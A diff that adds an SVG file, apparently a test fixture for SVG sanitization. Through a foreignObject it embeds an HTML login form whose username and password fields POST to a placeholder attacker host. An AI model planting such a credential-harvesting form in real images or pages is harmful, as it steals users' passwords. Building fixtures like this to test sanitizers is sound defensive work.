@@ -1,0 +1,11 @@
+<!-- inner-with-form.svg -->
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <foreignObject x="50" y="50" width="700" height="500">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <form method="POST" action="https://attacker.example.com/collect">
+        <input name="u" /><input name="p" type="password"/>
+        <button type="submit">Submit</button>
+      </form>
+    </body>
+  </foreignObject>
+</svg>
